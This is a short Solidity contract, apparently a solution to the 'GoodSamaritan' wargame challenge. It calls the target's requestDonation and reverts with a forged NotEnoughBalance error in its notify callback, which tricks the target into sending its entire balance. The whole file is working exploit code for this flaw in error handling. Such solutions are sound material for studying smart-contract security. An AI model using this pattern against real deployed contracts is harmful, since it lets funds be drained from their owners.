// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}


contract GoodSamaritanAttack { // 2) change nameattck

    IGoodSamaritan target;
    error NotEnoughBalance();

    constructor(address _target) {

        target = IGoodSamaritan(_target);
    }
    function attack() external {

        target.requestDonation();

    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}